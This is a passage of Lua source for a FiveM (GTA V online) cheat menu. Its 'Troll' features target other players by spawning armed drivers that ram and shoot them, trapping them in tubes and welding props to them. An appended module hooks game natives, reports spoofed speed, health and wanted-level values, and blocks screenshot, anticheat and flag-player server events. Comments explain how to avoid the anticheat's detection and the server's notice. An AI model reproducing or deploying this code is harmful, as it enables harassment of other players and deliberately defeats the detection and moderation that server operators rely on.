                -- missionType 8 = ram, drivingStyle 786468 = ignore tout
                TaskVehicleMissionPedTarget(
                    attackerPed,    -- driver
                    attackerVeh,    -- vehicle
                    targetPed,      -- target ped
                    8,              -- missionType: 8 = ram
                    100.0,          -- maxSpeed
                    786468,         -- drivingStyle: rush, ignore feux/obstacles
                    5.0,            -- targetReached dist
                    0.0,            -- straightLine dist
                    true            -- DriveAgainstTraffic
                )
            else
                -- === MODE CHASE : cible en véhicule ===
                -- Poursuite + tir drive-by
                if lastMode ~= "chase" then
                    ClearPedTasks(attackerPed)
                    Citizen.Wait(50)
                    print("[AssaultDriver] Mode CHASE + SHOOT (target in vehicle)")
                    lastMode = "chase"
                end

                -- Poursuite agressive
                TaskVehicleChase(attackerPed, targetPed)
                SetTaskVehicleChaseBehaviorFlag(attackerPed, 32, true) -- Ram
                SetTaskVehicleChaseIdealPursuitDistance(attackerPed, 0.0)

                -- Tir drive-by sur la cible si assez proche
                local dist = #(GetEntityCoords(attackerVeh) - GetEntityCoords(targetPed))
                if dist < 30.0 then
                    TaskDriveBy(
                        attackerPed,    -- shooter
                        targetPed,      -- target ped
                        0,              -- target vehicle (0 = ped target)
                        0.0, 0.0, 0.0,  -- offset
                        200.0,          -- distance de tir
                        100,            -- accuracy
                        true,           -- p8
                        GetHashKey("FIRING_PATTERN_FULL_AUTO")
                    )
                end
            end

            -- Auto-repair
            if GetVehicleEngineHealth(attackerVeh) < 200.0 then
                SetVehicleFixed(attackerVeh)
                SetVehicleEngineOn(attackerVeh, true, true, false)
            end

            Citizen.Wait(1500)
        end
    end)
end

function Menu.ActionAssaultDriver()
    if not Menu.SelectedPlayer then return end

    -- Cleanup previous
    if _G._assaultDriverActive then
        _G._assaultDriverActive = false
        Citizen.Wait(200)
        if _G._assaultDriverPed and DoesEntityExist(_G._assaultDriverPed) then
            SetEntityAsMissionEntity(_G._assaultDriverPed, true, true)
            DeleteEntity(_G._assaultDriverPed)
        end
        if _G._assaultDriverVeh and DoesEntityExist(_G._assaultDriverVeh) then
            SetEntityAsMissionEntity(_G._assaultDriverVeh, true, true)
            DeleteEntity(_G._assaultDriverVeh)
        end
    end

    local targetPlayerId = nil
    for _, p in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(p) == Menu.SelectedPlayer then
            targetPlayerId = p
            break
        end
    end
    if not targetPlayerId then return end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then return end
    local tc = GetEntityCoords(targetPed)

    local vehModel = GetHashKey("insurgent")
    local pedModel = GetHashKey("s_m_y_blackops_01")

    RequestModel(vehModel)
    RequestModel(pedModel)
    local t = 50
    while (not HasModelLoaded(vehModel) or not HasModelLoaded(pedModel)) and t > 0 do
        Citizen.Wait(10); t = t - 1
    end
    if not HasModelLoaded(vehModel) or not HasModelLoaded(pedModel) then
        print("[AssaultDriver] Failed to load models")
        return
    end

    -- Spawn 30m derrière la cible
    local fwd = GetEntityForwardVector(targetPed)
    local spawnX = tc.x - fwd.x * 30.0
    local spawnY = tc.y - fwd.y * 30.0

    local veh = nil
    local susano = rawget(_G, "Susano")
    if susano and type(susano.CreateSpoofedVehicle) == "function" then
        veh = susano.CreateSpoofedVehicle(vehModel, spawnX, spawnY, tc.z, GetEntityHeading(targetPed), false, false, false)
    else
        veh = CreateVehicle(vehModel, spawnX, spawnY, tc.z, GetEntityHeading(targetPed), false, false)
    end

    if not veh or veh == 0 or not DoesEntityExist(veh) then
        print("[AssaultDriver] Vehicle spawn failed")
        SetModelAsNoLongerNeeded(vehModel)
        SetModelAsNoLongerNeeded(pedModel)
        return
    end

    SetEntityAsMissionEntity(veh, true, true)
    SetVehicleModKit(veh, 0)
    SetVehicleMod(veh, 11, GetNumVehicleMods(veh, 11) - 1, false)
    SetVehicleMod(veh, 12, GetNumVehicleMods(veh, 12) - 1, false)
    SetVehicleMod(veh, 13, GetNumVehicleMods(veh, 13) - 1, false)
    SetVehicleMod(veh, 15, GetNumVehicleMods(veh, 15) - 1, false)
    SetVehicleColours(veh, 0, 0)

    local ped = CreatePed(4, pedModel, spawnX, spawnY, tc.z + 1.0, 0.0, false, false)
    if not ped or ped == 0 or not DoesEntityExist(ped) then
        print("[AssaultDriver] Ped spawn failed")
        DeleteEntity(veh)
        return
    end

    SetEntityAsMissionEntity(ped, true, true)
    SetPedIntoVehicle(ped, veh, -1)
    SetVehicleEngineOn(veh, true, true, false)
    SetModelAsNoLongerNeeded(vehModel)
    SetModelAsNoLongerNeeded(pedModel)

    _G._assaultDriverPed = ped
    _G._assaultDriverVeh = veh

    print("[AssaultDriver] Launched - Adaptive AI active")
    Menu.StartAssaultDriver(ped, veh, targetPed)
end

Actions.assaultDriverItem = FindItem("Online", "Troll", "Assault Driver")
if Actions.assaultDriverItem then
    Actions.assaultDriverItem.onClick = function()
        Menu.ActionAssaultDriver()
    end
end

-- ============================================
-- TUBE SYSTEM (Rainbow Tube + Trapped)
-- ============================================
_G._tubeStore = _G._tubeStore or {}

-- Helper : resolve target player to ped + coords
local function ResolveTargetCoords()
    if not Menu.SelectedPlayer then return nil, nil end
    local targetPlayerId = nil
    for _, p in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(p) == Menu.SelectedPlayer then
            targetPlayerId = p
            break
        end
    end
    if not targetPlayerId then return nil, nil end
    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then return nil, nil end
    return targetPed, GetEntityCoords(targetPed)
end

-- Spawn un prop sur la position d'un joueur ciblé
local function SpawnTubeProp(model, coords, heading)
    local hash = GetHashKey(model)
    RequestModel(hash)
    local t = 50
    while not HasModelLoaded(hash) and t > 0 do Citizen.Wait(10); t = t - 1 end
    if not HasModelLoaded(hash) then
        print("[Tube] ERROR: Model " .. model .. " not loaded")
        return 0
    end

    local obj = CreateObject(hash, coords.x, coords.y, coords.z, true, true, false)
    if obj and obj ~= 0 and DoesEntityExist(obj) then
        SetEntityAsMissionEntity(obj, true, true)
        NetworkRegisterEntityAsNetworked(obj)
        SetEntityHeading(obj, heading or 0.0)
        PlaceObjectOnGroundProperly(obj)
        SetEntityCollision(obj, true, true)
        FreezeEntityPosition(obj, true)
        _G._tubeStore[#_G._tubeStore + 1] = obj
        SetModelAsNoLongerNeeded(hash)
        return obj
    end
    SetModelAsNoLongerNeeded(hash)
    return 0
end

-- Rainbow Tube : ar_prop_ar_tube_crn_5d sur la position du joueur ciblé
function Menu.ActionRainbowTube()
    local targetPed, tc = ResolveTargetCoords()
    if not tc then
        print("[Tube] No target")
        return
    end
    local heading = GetEntityHeading(targetPed)
    local obj = SpawnTubeProp("ar_prop_ar_tube_crn_5d", tc, heading)
    if obj ~= 0 then
        print("[Tube] Rainbow tube spawned on target, handle=" .. tostring(obj))
    end
end

-- Trapped in Tube : stt_prop_stunt_tube_l centré sur le joueur
-- Le tube est posé de façon à enfermer le joueur dedans (rotation 90° pour être vertical/horizontal)
function Menu.ActionTrappedInTube()
    local targetPed, tc = ResolveTargetCoords()
    if not tc then
        print("[Tube] No target")
        return
    end

    local model = "stt_prop_stunt_tube_l"
    local hash = GetHashKey(model)
    RequestModel(hash)
    local t = 50
    while not HasModelLoaded(hash) and t > 0 do Citizen.Wait(10); t = t - 1 end
    if not HasModelLoaded(hash) then return end

    -- Spawn le tube directement sur le joueur
    local obj = CreateObject(hash, tc.x, tc.y, tc.z - 1.0, true, true, false)
    if obj and obj ~= 0 and DoesEntityExist(obj) then
        SetEntityAsMissionEntity(obj, true, true)
        NetworkRegisterEntityAsNetworked(obj)
        -- Rotation X=90° : tube posé à l'horizontale autour du joueur
        SetEntityRotation(obj, 90.0, 0.0, GetEntityHeading(targetPed), 2, true)
        FreezeEntityPosition(obj, true)
        SetEntityCollision(obj, true, true)
        SetEntityInvincible(obj, true) -- Indestructible
        _G._tubeStore[#_G._tubeStore + 1] = obj
        SetModelAsNoLongerNeeded(hash)
        print("[Tube] Target trapped in tube, handle=" .. tostring(obj))
    else
        SetModelAsNoLongerNeeded(hash)
    end
end

-- Delete all tubes
function Menu.DeleteAllTubes()
    local store = _G._tubeStore
    if store then
        for i = #store, 1, -1 do
            local obj = store[i]
            if obj and DoesEntityExist(obj) then
                SetEntityInvincible(obj, false)
                SetEntityAsMissionEntity(obj, true, true)
                DeleteEntity(obj)
            end
        end
    end
    _G._tubeStore = {}
    print("[Tube] All tubes deleted")
end

-- onClick handlers
Actions.rainbowTubeItem = FindItem("Online", "Troll", "Rainbow Tube")
if Actions.rainbowTubeItem then
    Actions.rainbowTubeItem.onClick = function()
        Menu.ActionRainbowTube()
    end
end

Actions.trappedInTubeItem = FindItem("Online", "Troll", "Trapped in Tube")
if Actions.trappedInTubeItem then
    Actions.trappedInTubeItem.onClick = function()
        Menu.ActionTrappedInTube()
    end
end

Actions.deleteAllTubesItem = FindItem("Online", "Troll", "Delete All Tubes")
if Actions.deleteAllTubesItem then
    Actions.deleteAllTubesItem.onClick = function()
        Menu.DeleteAllTubes()
    end
end

-- ============================================
-- ATTACH TOILET (Fun Props on Target Player)
-- ============================================
_G._attachedToiletStore = _G._attachedToiletStore or {}

function Menu.ActionAttachToilet()
    if not Menu.SelectedPlayer then return end

    local targetPlayerId = nil
    for _, p in ipairs(GetActivePlayers()) do
        if GetPlayerServerId(p) == Menu.SelectedPlayer then
            targetPlayerId = p
            break
        end
    end
    if not targetPlayerId then return end

    local targetPed = GetPlayerPed(targetPlayerId)
    if not DoesEntityExist(targetPed) then return end

    local model = "prop_ld_toilet_01"
    local hash = GetHashKey(model)
    RequestModel(hash)
    local t = 50
    while not HasModelLoaded(hash) and t > 0 do Citizen.Wait(10); t = t - 1 end
    if not HasModelLoaded(hash) then
        print("[Toilet] Model failed to load")
        return
    end

    local tc = GetEntityCoords(targetPed)
    local obj = CreateObject(hash, tc.x, tc.y, tc.z + 1.0, true, true, false)

    if not obj or obj == 0 or not DoesEntityExist(obj) then
        SetModelAsNoLongerNeeded(hash)
        return
    end

    SetEntityAsMissionEntity(obj, true, true)
    NetworkRegisterEntityAsNetworked(obj)

    -- Bone SKEL_Head (tête) pour l'effet ridicule
    local boneIndex = GetPedBoneIndex(targetPed, 31086) -- SKEL_Head

    -- Attach sur la tête du joueur ciblé
    -- Offsets : X=0 centré, Y=0 centré, Z=0.2 légèrement au-dessus
    AttachEntityToEntity(
        obj, targetPed,
        boneIndex,
        0.0, 0.0, 0.2,    -- offset X, Y, Z (au-dessus de la tête)
        0.0, 0.0, 0.0,    -- rotation
        true,   -- p9
        true,   -- useSoftPinning (reste attaché quand le joueur bouge)
        false,  -- collision OFF (évite que l'objet pousse le joueur)
        true,   -- isPed = true (attaché à un ped)
        0,      -- vertexIndex
        true    -- fixedRot
    )

    SetEntityInvincible(obj, true)
    SetModelAsNoLongerNeeded(hash)

    _G._attachedToiletStore[#_G._attachedToiletStore + 1] = obj
    print("[Toilet] Attached to target head, handle=" .. tostring(obj))
end

function Menu.ClearAllAttachedProps()
    local store = _G._attachedToiletStore
    if store then
        for i = #store, 1, -1 do
            local obj = store[i]
            if obj and DoesEntityExist(obj) then
                SetEntityInvincible(obj, false)
                DetachEntity(obj, true, true)
                SetEntityAsMissionEntity(obj, true, true)
                DeleteEntity(obj)
            end
        end
    end
    _G._attachedToiletStore = {}
    print("[Toilet] All attached props cleared")
end

Actions.attachToiletItem = FindItem("Online", "Troll", "Attach Toilet")
if Actions.attachToiletItem then
    Actions.attachToiletItem.onClick = function()
        Menu.ActionAttachToilet()
    end
end

Actions.clearAllAttachedItem = FindItem("Online", "Troll", "Clear All Attached")
if Actions.clearAllAttachedItem then
    Actions.clearAllAttachedItem.onClick = function()
        Menu.ClearAllAttachedProps()
    end
end

-- ============================================================================
-- SEED MODULE  (appended to the BUSDANSTETE loader)
-- ----------------------------------------------------------------------------
-- Features Susano does NOT ship, and only those:
--
--   * Player Props -> weld a solid, networked prop on yourself, on one
--     selected player, or on every player in scope.
--   * Prop Effects -> rain, fountain, cage, orbit, ragdoll, decoy clone.
--   * Seed         -> one entry in Exploit > Bypass. Click it to arm the
--     native hooks (HookNative) and the inbound event shield
--     (BlockServerEvent / GetAllEvent). Click again to release everything.
--
-- Not re-implemented on purpose: spoofed vehicles, ghost, hardening,
-- outbound event wrappers - Susano already owns those.
--
-- Keys are NOT modified: the loader keeps its own menu key, its key selector
-- and its input loop.
-- ============================================================================

;(function()

local Api = rawget(_G, "Susano")
if type(Api) ~= "table" then
    print("[SEED] Susano API not found - module not loaded")
    return
end

--------------------------------------------------------------------------------
-- CONFIG
--------------------------------------------------------------------------------

local CFG = {
    -- Attach points that exist on every R6/R15 ped.
    boneOrder  = { "back", "head", "hand" },
    boneLabels = { "Back", "Head", "Right hand" },
    boneIds    = { back = 24818, head = 31086, hand = 57005 },

    targetModes = { "self", "player", "all" },

    -- Event names that must never reach the Lua dispatcher. Patterns are
    -- matched on the lowercased name by GetAllEvent().
    blockPatterns = {
        "screenshot", "screen_shot", "screencap", "printscreen",
        "spectate", "ac_flag", "ac_report", "anticheat", "violation",
        "cheat_detect", "flag_player",
    },

    -- Liveness channels owned by an anticheat: dropping them is a detection.
    protectedPrefixes = { "ach_", "acr_", "axa_", "axb_" },

    eventSweepRate = 60000,
}

local C = {
    white = { 245, 245, 245, 255 },
    grey  = { 148, 148, 156, 255 },
    green = { 110, 220, 140, 255 },
    red   = { 240, 100, 105, 255 },
    blue  = { 120, 175, 255, 255 },
}

--------------------------------------------------------------------------------
-- STATE
--------------------------------------------------------------------------------

local S = {
    -- props
    targetMode   = 2,   -- self / player / all
    attachTarget = true,
    attachBone   = 1,   -- 1 = back, 2 = head, 3 = right hand

    -- protection: all on once the Seed entry is clicked; the individual
    -- checks are internal defaults, they are not exposed in the menu
    hooks         = false,
    antiTeleport  = true,
    antiKill      = true,
    antiDelete    = true,
    antiAttach    = true,
    antiRagdoll   = true,
    antiVehicle   = true,
    antiFreeze    = true,
    antiSpectate  = true,
    telemetry     = true,

    -- values the telemetry hooks report
    speedFloor    = 5.6,
    speedCeil     = 8.4,
    healthMin     = 188,
    healthMax     = 199,
}

-- `world = true` props are never welded to a ped: they are placed on the
-- ground as solid world objects (a ramp welded to a vehicle transfers every
-- ground contact to the chassis and makes it hop).
local PROP_LIST = {
    { label = "Ramp",             model = "prop_mp_ramp_01",        extra = 0.0, world = true },
    { label = "Tube corner (XL)", model = "ar_prop_ar_tube_crn_5d", extra = 3.5 },
    { label = "Container (XL)",   model = "prop_container_01a",     extra = 4.0 },
    { label = "Road cone",        model = "prop_roadcone02a",       extra = 0.0 },
}

local Spawned = {}
local MAX_SPAWNED = 20
local SPAWN_COOLDOWN = 350
local lastSpawnAt = 0

-- Short-lived effect objects (rain, fountain, cage, orbit, clones) are removed
-- on a timer: a permanent trail of networked entities is the easiest thing to
-- correlate with a player.
local FxExpiry = {}
local Clones = {}

-- Set while this module writes a native that its own hooks would block
-- (attaching a prop to the local ped, restoring health, ...). An upvalue,
-- not a _G flag: nothing outside the module can read or forge it.
local Bypass = false

--------------------------------------------------------------------------------
-- UTILITIES
--------------------------------------------------------------------------------

local function Log(level, fmt, ...)
    local message = fmt
    if select("#", ...) > 0 then
        local ok, formatted = pcall(string.format, fmt, ...)
        message = ok and formatted or tostring(fmt)
    end
    print(("[SEED][%s] %s"):format(level, message))
end

local Toasts = {}

local function Notify(message, colour)
    Toasts[#Toasts + 1] = {
        text = tostring(message),
        at = GetGameTimer(),
        colour = colour or C.white,
    }
    if #Toasts > 6 then table.remove(Toasts, 1) end
    Log("INFO", "%s", message)
end

local function CurrentBone()
    local name = CFG.boneOrder[S.attachBone or 1] or "back"
    return CFG.boneIds[name] or 24818
end

local function CurrentBoneLabel()
    return CFG.boneLabels[S.attachBone or 1] or "Back"
end

local function IsProtectedChannel(name)
    local lowered = string.lower(tostring(name))
    local head = lowered:sub(1, 4)
    for i = 1, #CFG.protectedPrefixes do
        if head == CFG.protectedPrefixes[i] then return true end
    end
    return false
end

local function SpawnGate()
    local now = GetGameTimer()
    if now - lastSpawnAt < SPAWN_COOLDOWN then return false end
    lastSpawnAt = now
    return true
end

--------------------------------------------------------------------------------
-- SHARED CONTEXT
--------------------------------------------------------------------------------

-- One thread owns every native read used by the hooks. A native call inside
-- a native hook is the fastest way to deadlock the VM, so callbacks only read
-- these cached values.
local Ctx = { ped = 0, player = 0, vehicle = 0, health = 200 }

Citizen.CreateThread(function()
    while true do
        local ped = PlayerPedId()
        Ctx.ped = ped
        Ctx.player = PlayerId()
        Ctx.vehicle = GetVehiclePedIsIn(ped, false) or 0
        Ctx.health = GetEntityHealth(ped)
        Citizen.Wait(250)
    end
end)

local function MutationsBlocked()
    return Bypass
end

local function IsLocalPed(entity)
    return type(entity) == "number" and entity ~= 0 and entity == Ctx.ped
end

--------------------------------------------------------------------------------
-- NATIVE HOOKS  (Susano.HookNative)
--------------------------------------------------------------------------------

local HookStats = { installed = 0, failed = 0 }
local HookList = {}

local function hook(name, hash, fn)
    HookList[#HookList + 1] = { name = name, hash = hash, fn = fn }
end

local function buildHooks()
    -- teleport ---------------------------------------------------------------
    hook("SET_ENTITY_COORDS", 0x06843DA7060A026B, function(entity)
        if not S.hooks or not S.antiTeleport or MutationsBlocked() or not IsLocalPed(entity) then
            return true
        end
        return false
    end)

    hook("SET_ENTITY_COORDS_NO_OFFSET", 0x239A3351AC1DA385, function(entity)
        if not S.hooks or not S.antiTeleport or MutationsBlocked() or not IsLocalPed(entity) then
            return true
        end
        return false
    end)

    hook("SET_PED_COORDS_KEEP_VEHICLE", 0x9AFEFF481A85AB2E, function(ped)
        if not S.hooks or not S.antiTeleport or MutationsBlocked() or not IsLocalPed(ped) then
            return true
        end
        return false
    end)

    -- health -----------------------------------------------------------------
    hook("SET_ENTITY_HEALTH", 0x6B76DC1F3AE6E6A3, function(entity, health)
        if not S.hooks or not S.antiKill or MutationsBlocked() or not IsLocalPed(entity) then
            return true
        end
        if type(health) ~= "number" then return true end
        if health <= 0 or health < 100 then return false end
        if health < Ctx.health - 50 then return false end
        return true
    end)

    hook("SET_ENTITY_MAX_HEALTH", 0x166E7CF68597D8B5, function(entity, maxHealth)
        if not S.hooks or not S.antiKill or MutationsBlocked() or not IsLocalPed(entity) then
            return true
        end
        if type(maxHealth) == "number" and maxHealth < 100 then return false end
        return true
    end)

    -- entity -----------------------------------------------------------------
    hook("DELETE_ENTITY", 0xAE3CBE5BF394C9C9, function(entity)
        if not S.hooks or not S.antiDelete or MutationsBlocked() or not IsLocalPed(entity) then
            return true
        end
        return false
    end)

    hook("ATTACH_ENTITY_TO_ENTITY", 0x6B9BBD38AB0796DF, function(entity, attachTo)
        if not S.hooks or not S.antiAttach or MutationsBlocked() then return true end
        if IsLocalPed(entity) or IsLocalPed(attachTo) then return false end
        return true
    end)

    -- ragdoll / ped flags ----------------------------------------------------
    hook("SET_PED_CAN_RAGDOLL", 0xB128377056A54E2A, function(ped, toggle)
        if not S.hooks or not S.antiRagdoll or not IsLocalPed(ped) then return true end
        if toggle == false then return false end
        return true
    end)

    hook("SET_PED_CONFIG_FLAG", 0x1913FE4CBF41C463, function(ped, flagId, value)
        if not S.hooks or not S.antiRagdoll or value ~= true or not IsLocalPed(ped) then
            return true
        end
        if flagId == 32 or flagId == 227 or flagId == 243 or flagId == 342 then
            return false
        end
        return true
    end)

    -- vehicle ----------------------------------------------------------------
    hook("SMASH_VEHICLE_WINDOW", 0x9E5B5E4D2CCD2259, function(vehicle)
        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
        return false
    end)

    hook("SET_VEHICLE_DOOR_BROKEN", 0xD4D4F6A4AB575A33, function(vehicle, _door, deleteDoor)
        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
        if deleteDoor == true then return false end
        return true
    end)

    hook("SET_VEHICLE_UNDRIVEABLE", 0x8ABA6AF54B942B95, function(vehicle, toggle)
        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
        if toggle == true then return false end
        return true
    end)

    hook("SET_VEHICLE_DOORS_LOCKED", 0xB664292EAECF7FA6, function(vehicle, status)
        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
        if type(status) == "number" and status > 1 then return false end
        return true
    end)

    hook("SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS", 0xA2F80B8D040727CC, function(vehicle, toggle)
        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
        if toggle == true then return false end
        return true
    end)

    hook("SET_VEHICLE_ENGINE_HEALTH", 0x45F6D8EEF34ABEF1, function(vehicle, health)
        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
        if type(health) == "number" and health < 900.0 then return false end
        return true
    end)

    hook("SET_VEHICLE_BODY_HEALTH", 0xB77D05AC8C78AADB, function(vehicle, health)
        if not S.hooks or not S.antiVehicle or vehicle ~= Ctx.vehicle then return true end
        if type(health) == "number" and health < 900.0 then return false end
        return true
    end)

    -- freeze / spectate ------------------------------------------------------
    hook("FREEZE_ENTITY_POSITION", 0x428CA6DBD1094446, function(entity, toggle)
        if not S.hooks or not S.antiFreeze or not IsLocalPed(entity) then return true end
        if toggle == true then return false end
        return true
    end)

    hook("SET_ENTITY_DYNAMIC", 0x1718DE8E3F2823CA, function(entity, toggle)
        if not S.hooks or not S.antiFreeze or not IsLocalPed(entity) then return true end
        if toggle == false then return false end
        return true
    end)

    hook("NETWORK_SET_IN_SPECTATOR_MODE", 0x423DE3854BB50894, function(toggle, player)
        if not S.hooks or not S.antiSpectate or player ~= Ctx.player then return true end
        if toggle == true then return false end
        return true
    end)

    hook("NETWORK_IS_IN_SPECTATOR_MODE", 0x048746E388762E11, function()
        if not S.hooks or not S.antiSpectate then return true end
        return false, false
    end)

    -- telemetry (getters) ----------------------------------------------------
    hook("GET_ENTITY_SPEED", 0xD5037BA82E12416F, function(entity)
        if not S.hooks or not S.telemetry or entity ~= Ctx.ped or Ctx.vehicle ~= 0 then
            return true
        end
        return false, S.speedFloor + math.random() * (S.speedCeil - S.speedFloor)
    end)

    hook("GET_ENTITY_HEIGHT_ABOVE_GROUND", 0x1DD55701034110E5, function(entity)
        if not S.hooks or not S.telemetry or entity ~= Ctx.ped then return true end
        return false, 0.0
    end)

    hook("GET_PLAYER_WANTED_LEVEL", 0xE28E54788CE8F12D, function(player)
        if not S.hooks or not S.telemetry or player ~= Ctx.player then return true end
        return false, 0
    end)

    hook("GET_PLAYER_INVINCIBLE", 0xB721981B2B939E07, function(player)
        if not S.hooks or not S.telemetry or player ~= Ctx.player then return true end
        return false, false
    end)

    hook("GET_ENTITY_HEALTH", 0xEEF059FAD016D209, function(entity)
        if not S.hooks or not S.telemetry or entity ~= Ctx.ped then return true end
        return false, math.random(S.healthMin, S.healthMax)
    end)

    hook("GET_PED_ARMOUR", 0x9483AF821605B1D8, function(entity)
        if not S.hooks or not S.telemetry or entity ~= Ctx.ped then return true end
        return false, 0
    end)
end

buildHooks()

local function InstallNativeHooks()
    if type(Api.HookNative) ~= "function" then
        Log("WARN", "HookNative unavailable - protection hooks not installed")
        return
    end

    HookStats.installed, HookStats.failed = 0, 0

    for i = 1, #HookList do
        local entry = HookList[i]

        -- A previous install (menu toggle) must not stack a second callback
        -- on the same native.
        if type(Api.UnhookNative) == "function" then
            pcall(Api.UnhookNative, entry.hash)
        end

        local ok, err = pcall(Api.HookNative, entry.hash, entry.fn)
        if ok then
            HookStats.installed = HookStats.installed + 1
        else
            HookStats.failed = HookStats.failed + 1
            Log("WARN", "hook %s failed: %s", entry.name, tostring(err))
        end
    end

    if type(Api.HasNativeHookInitializationFailed) == "function" then
        local ok, failed = pcall(Api.HasNativeHookInitializationFailed)
        if ok and failed then
            Log("WARN", "HookNative reported an initialization failure")
        end
    end

    Log("INFO", "%d native hooks installed, %d failed", HookStats.installed, HookStats.failed)
end

local function RemoveNativeHooks()
    if type(Api.UnhookNative) ~= "function" then
        Log("WARN", "UnhookNative unavailable - hooks stay installed but inert")
        return
    end

    for i = 1, #HookList do
        pcall(Api.UnhookNative, HookList[i].hash)
    end

    HookStats.installed = 0
    Log("INFO", "native hooks removed")
end

--------------------------------------------------------------------------------
-- EVENT SHIELD  (Susano.BlockServerEvent / Susano.GetAllEvent)
--------------------------------------------------------------------------------

local blockedByShield = {}

local function ShieldAvailable()
    return type(Api.BlockServerEvent) == "function"
end

local function BlockEvent(name)
    if not ShieldAvailable() then return false end
    if type(name) ~= "string" or name == "" then return false end
    if IsProtectedChannel(name) then return false end
    if blockedByShield[name] then return true end

    local ok = pcall(Api.BlockServerEvent, true, name)
    if ok then
        blockedByShield[name] = true
        return true
    end
    return false
end

local function UnblockAllEvents()
    if not ShieldAvailable() then return 0 end

    local released = 0
    for name in pairs(blockedByShield) do
        pcall(Api.BlockServerEvent, false, name)
        released = released + 1
    end

    blockedByShield = {}
    return released
end

local function SweepEvents()
    if not ShieldAvailable() or type(Api.GetAllEvent) ~= "function" then return 0 end

    local ok, events = pcall(Api.GetAllEvent)
    if not ok or type(events) ~= "table" then return 0 end

    local added = 0

    for i = 1, #events do
        local entry = events[i]
        local name = type(entry) == "table" and entry.event or entry

        if type(name) == "string" and name ~= ""
            and not blockedByShield[name] and not IsProtectedChannel(name) then
            local lowered = string.lower(name)

            for p = 1, #CFG.blockPatterns do
                if string.find(lowered, CFG.blockPatterns[p], 1, true) then
                    if BlockEvent(name) then added = added + 1 end
                    break
                end
            end
        end
    end

    return added
end

local function ApplyEventShield(state)
    if not state then
        local released = UnblockAllEvents()
        Log("INFO", "event shield off - %d channel(s) released", released)
        return
    end

    if not ShieldAvailable() then
        Log("WARN", "BlockServerEvent unavailable - event shield inert")
        return
    end

    local blocked = SweepEvents()

    -- Fixed list: blocked even before the resource registers its listener.
    for i = 1, #CFG.blockPatterns do
        BlockEvent(CFG.blockPatterns[i])
    end

    Log("INFO", "event shield on - %d live channel(s) blocked", blocked)
end

--------------------------------------------------------------------------------
-- MODELS
--------------------------------------------------------------------------------

local function LoadModel(hash, model)
    RequestModel(hash)

    local deadline = GetGameTimer() + 5000
    while not HasModelLoaded(hash) do
        if GetGameTimer() > deadline then
            SetModelAsNoLongerNeeded(hash)
            return false, ("%s never streamed"):format(model)
        end
        Citizen.Wait(10)
    end

    return true
end

--------------------------------------------------------------------------------
-- ATTACHMENT
--------------------------------------------------------------------------------

local function AttachToBone(obj, boneIndex, entity)
    if type(boneIndex) ~= "number" then return false end

    local target = entity or PlayerPedId()
    local previous = Bypass
    Bypass = true

    local ok = pcall(AttachEntityToEntity, obj, target, boneIndex,
        0.0, 0.0, 0.0, 0.0, 0.0, 0.0,
        false, false, false, true, 2, true)

    Bypass = previous

    if not ok then return false end

    -- A remote ped cannot be verified with GetEntityAttachedTo: the link is
    -- owned by the other client. Local ped: verify the real link.
    if target ~= PlayerPedId() then return true end

    Citizen.Wait(0)
    return GetEntityAttachedTo(obj) == target
end

-- A local CreateObject only exists for this client. Registering the entity on
-- the network gives it a network ID, which is what makes other players see it.
local function EnsureNetworked(obj)
    if not obj or obj == 0 or not DoesEntityExist(obj) then return 0 end

    local function published(netId)
        if type(netId) ~= "number" or netId == 0 then return 0 end
        pcall(SetNetworkIdExistsOnAllMachines, netId, true)
        pcall(SetNetworkIdCanMigrate, netId, true)
        return netId
    end

    local ok, netId = pcall(NetworkGetNetworkIdFromEntity, obj)
    if ok and type(netId) == "number" and netId ~= 0 then return published(netId) end

    pcall(NetworkRegisterEntityAsNetworked, obj)

    for _ = 1, 10 do
        Citizen.Wait(50)
        ok, netId = pcall(NetworkGetNetworkIdFromEntity, obj)
        if ok and type(netId) == "number" and netId ~= 0 then return published(netId) end
    end

    return 0
end

--------------------------------------------------------------------------------
-- PROP LIFECYCLE
--------------------------------------------------------------------------------

local function ForgetProp(obj)
    for i = #Spawned, 1, -1 do
        if Spawned[i] == obj then table.remove(Spawned, i) end
    end
end

local function DeleteProp(obj)
    if obj and obj ~= 0 and DoesEntityExist(obj) then
        pcall(NetworkRequestControlOfEntity, obj)
        pcall(SetEntityAsMissionEntity, obj, true, true)

        local previous = Bypass
        Bypass = true
        pcall(DeleteObject, obj)
        Bypass = previous
    end
    if obj then ForgetProp(obj) end
end

-- A client that keeps dozens of networked objects alive is easy to spot from
-- the server. Old props are recycled instead of accumulating.
local function TrimSpawned()
    while #Spawned > MAX_SPAWNED do
        DeleteProp(table.remove(Spawned, 1))
    end
end

local function SpawnProp(entry, extra, targetPed, targetName, attachToTarget)
    local model = entry.model
    local world = entry.world == true

    Citizen.CreateThread(function()
        -- Randomised start: when a burst is sent to several players, the
        -- objects must not appear on the same tick.
        Citizen.Wait(math.random(20, 160))

        local hash = GetHashKey(model)
        local loaded, reason = LoadModel(hash, model)
        if not loaded then
            Notify(reason, C.red)
            return
        end

        local localPed = PlayerPedId()
        local remote = targetPed ~= nil and targetPed ~= 0 and targetPed ~= localPed
        local ped = remote and targetPed or localPed
        local who = remote and (targetName or "player") or nil

        if not DoesEntityExist(ped) then
            Notify("Target ped is gone", C.red)
            SetModelAsNoLongerNeeded(hash)
            return
        end

        -- A ped sitting in a car: welding a 4 m prop to its spine makes the
        -- chassis climb on every ground contact. The prop is dropped next to
        -- the car as a normal world object instead.
        local vehicle = 0
        do
            local okVeh, v = pcall(GetVehiclePedIsIn, ped, false)
            if okVeh and type(v) == "number" and v ~= 0 and DoesEntityExist(v) then
                vehicle = v
            end
        end

        local inVehicle = vehicle ~= 0
        local heading = GetEntityHeading(inVehicle and vehicle or ped)
        local pitch = 0.0
        local roll = 0.0
        local target

        if world or inVehicle then
            local base = inVehicle and vehicle or ped
            local forward = 4.0

            if inVehicle then
